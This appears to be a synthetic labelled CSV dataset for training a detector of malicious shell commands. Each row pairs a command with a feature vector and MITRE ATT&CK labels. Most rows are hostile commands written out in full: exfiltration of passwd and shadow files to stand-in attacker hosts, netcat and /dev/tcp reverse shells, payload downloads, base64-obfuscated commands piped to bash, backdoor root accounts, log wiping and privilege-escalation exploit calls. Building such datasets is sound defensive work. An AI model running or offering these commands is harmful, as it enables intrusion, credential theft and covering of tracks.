command,features,label,source
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
sudo net localgroup administrators,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
echo  'bHMgLWxhIC9yb290IC9ldGMgL3Zhci93d3c='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
ps aux | grep nginx,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.2, 1, 0]",['BENIGN'],synthetic
wget --post-file=/etc/passwd http://attacker.com/receive,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
time echo 'Y3VybCAtWCBQT1NUIGh0dHA6Ly9ldmlsLmNvbS9jb2xsZWN0IC1kIEAvZXRjL3NoYWRvdw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
psexec.py Administrator:password@10.0.0.5 cmd.exe | sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo useradd -m -s /bin/bash -G sudo newadmin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1098_Account_Manipulation'],synthetic
nohup find / -writable -type d 2>/dev/null ; history -c &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0.0, 0.44, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo nmap --script=vuln 10.0.0.1 ; sleep 1,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ls -la /root /etc /var/www && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 1]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""nmap -sV -p 22,80,443 10.0.0.0/24""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
echo 'c3NoIGFkbWluQGxvY2FsaG9zdCA7IGhpc3RvcnkgLWM=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'dw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
"bash -c ""for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.72, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
psexec.py Administrator:password@10.0.0.5 cmd.exe,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1021_Remote_Services'],synthetic
time sudo -u www-data bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1078_Valid_Accounts'],synthetic
nohup cat /etc/hostname &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
echo 'bmMgLXp2IDEwLjAuMC4xIDEtMTAwMCAyPiYxIHwgZ3JlcCBzdWNjZWVkZWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'dW5zaGFkb3cgL2V0Yy9wYXNzd2QgL2V0Yy9zaGFkb3cgPiBjcmFja21l' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'cGFzc3dkIC1kIHJvb3Q=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo ls -la /root /etc /var/www ; history -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
fping -a -g 192.168.1.0/24 2>/dev/null,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
nohup find / -name '*.conf' -readable 2>/dev/null | head -20 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.44, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
masscan -p1-65535 10.0.0.0/24 --rate=1000,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
cat  /etc/passwd  |  awk  -F:  '$3  >=  1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
echo 'c3UgLSBhZG1pbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'd21pZXhlYy5weSBkb21haW4vYWRtaW46cGFzc0AxMC4wLjAuNQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo net localgroup administrators,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
sudo w,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
sudo nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.32, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
"bash -c ""bash -i >& /dev/tcp/10.0.0.99/4444 0>&1 | sleep 1""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo 'd2hv' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time powershell.exe -EncodedCommand JABzA...,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
uname -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
find / -name 'id_rsa' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
nohup useradd -m -s /bin/bash -G sudo newadmin && sleep 1 &,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time smbclient //10.0.0.5/C$ -U Administrator | history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
useradd  -o  -u  0  -g  0  -M  -d  /root  -s  /bin/bash  ghost  |  >  /dev/null  2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.64, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyB1cmxsaWIucmVxdWVzdC51cmxyZXRyaWV2ZSgnaHR0cDovL2V2aWwuY29tL3BheWxvYWQnLCAnL3RtcC9wYXlsb2FkJyki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
wmic useraccount list && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
shred -u /var/log/auth.log | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0.2, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup cat /tmp/encoded | xxd -r -p | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.4, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
time echo 'aWQgLUdu' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"sudo perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/'","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
scp file.txt user@host:/tmp/,"[0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo  'cHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyB1cmxsaWIucmVxdWVzdC51cmxvcGVuKCdodHRwOi8vZXZpbC5jb20vPycgKyBvcGVuKCcvZXRjL3NoYWRvdycpLnJlYWQoKSki'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
time medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh ; > /dev/null 2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.0, 0.56, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
getent  passwd  |  awk  -F:  '$3  >=  1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
"bash -c ""nc -e /bin/bash attacker.com 80""","[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
echo 'c3NoIC1pIH4vLnNzaC9zdG9sZW5fa2V5IHJvb3RAMTAuMC4wLjU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""sed -i 's/old/new/g' config.cfg""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['BENIGN'],synthetic
whoami /all && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
hostnamectl,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
echo 'Y3VybCAtQSAnTW96aWxsYS81LjAnIGh0dHA6Ly9jMi5hdHRhY2tlci5jb20vY2hlY2staW4=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""smbclient //10.0.0.5/C$ -U Administrator ; history -c""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cGFzc3dkIC1kIHJvb3QgOyBoaXN0b3J5IC1j' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
whoami /all,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
curl -s https://api.github.com/repos/user/repo,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
nohup net localgroup administrators &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
time net user /domain,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1087_Account_Discovery'],synthetic
nohup cat /etc/passwd | grep -v nologin | grep -v false &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.4, 0.48, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
wget http://attacker.com/payload -O /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
net localgroup administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
unset HISTFILE; export HISTSIZE=0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
echo  'cHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyB1cmxsaWIucmVxdWVzdC51cmxyZXRyaWV2ZSgnaHR0cDovL2V2aWwuY29tL3BheWxvYWQnLCAnL3RtcC9wYXlsb2FkJyki'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
"perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
crontab -l,"[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1070_Indicator_Removal'],synthetic
who,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
echo 'Li9DVkUtMjAyMS00MDM0IDsgZWNobyBkb25l' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
pip install requests,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
find  /  -name  'id_rsa'  2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
psexec.py  Administrator:password@10.0.0.5  cmd.exe,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1021_Remote_Services'],synthetic
id,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
ssh -i ~/.ssh/stolen_key root@10.0.0.5 | chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 1]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
net  user  /domain,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1087_Account_Discovery'],synthetic
tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
> ~/.bash_history && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]",['T1070_Indicator_Removal'],synthetic
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
"bash -c ""cat /tmp/encoded | xxd -r -p | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.4, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
tar -czf backup.tar.gz /home/user,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
echo  'd2dldCAtcSBodHRwOi8vbWluZXIuY29tL3htcmlnIC1PIC90bXAveG1yICYmIGNobW9kICt4IC90bXAveG1yICYmIC90bXAveG1yIC1vIHBvb2wubWluZXhtci5jb206NDQz'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""who""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
psexec.py Administrator:password@10.0.0.5 cmd.exe,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1021_Remote_Services'],synthetic
nohup wget -q -O- --header='X-Auth: token123' http://evil.com/cmd &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
echo  'cGFzc3dkIC1kIHJvb3Q='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
lscpu,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
cat  /etc/resolv.conf  &&  >  /dev/null  2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo nc -e /bin/bash attacker.com 80 && sleep 1,"[0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bm1hcCAtQSAtVDQgMTkyLjE2OC4xLjAvMjQgfCBjaG1vZCAreCAvdG1wL3BheWxvYWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'Z3JvdXBz' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"ldapsearch  -x  -b  'dc=domain,dc=com'  '(objectClass=person)'  &&  chmod  +x  /tmp/payload","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time (crontab -l; echo '* * * * * /tmp/payload.sh') | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.52, 1, 0]",['T1053_Scheduled_Task'],synthetic
nohup wget --post-file=/etc/passwd http://attacker.com/receive | sleep 1 &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bmMgLXp2IDEwLjAuMC4xIDEtMTAwMCAyPiYxIHwgZ3JlcCBzdWNjZWVkZWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
net localgroup administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
./CVE-2021-4034,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
echo 'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOy4uLic=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
